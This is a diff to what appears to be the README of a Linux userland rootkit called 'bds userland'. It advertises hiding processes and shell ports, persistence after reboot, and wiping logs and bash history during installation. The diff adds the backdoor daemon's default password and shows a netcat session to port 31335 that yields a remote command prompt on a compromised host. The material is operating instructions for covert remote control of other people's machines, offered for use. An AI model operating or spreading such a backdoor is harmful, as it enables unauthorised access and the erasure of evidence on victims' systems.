@@ -10,7 +10,7 @@ Twitter : https://twitter.com/bluedragonsec
 - Hide process
 - Hide bind shell port, bds daemon port and reverse shell port from netstat
 - Rootkit persistence to survive after reboot
-- clean logs and bash history during installation
+- Clean logs and bash history during installation
 
 ====INSTALLATION====
 
@@ -48,7 +48,7 @@ ________________________________________________________________________________
 
 ==Using the Rootkit Daemon
 
-Rootkit built in daemon is listening on port 31335. Using the rootkit built in daemon, you can issue a reverse shell connection and executing linux command on target machine (which you have installed rootkit) remotely. To connect to rootkit daemon, open your terminal and type :
+Rootkit built in daemon is listening on port 31335, default password is bluedragonsec. Using the rootkit built in daemon, you can issue a reverse shell connection and executing linux command on target machine (which you have installed rootkit) remotely. To connect to rootkit daemon, open your terminal and type :
 _________________________
 
 nc "target ip" 31335
@@ -60,6 +60,7 @@ Example :
 You have installed bds userland on ip address 192.168.43.36 , open terminal and type:
 _____________________________________________________
 robotsoft@robotsoft:~$ nc 192.168.43.36 31335
+Password :bluedragonsec
 CMD :
 Type any linux command in cmd prompt
 robotsoft@robotsoft:~$ nc 192.168.43.36 31335
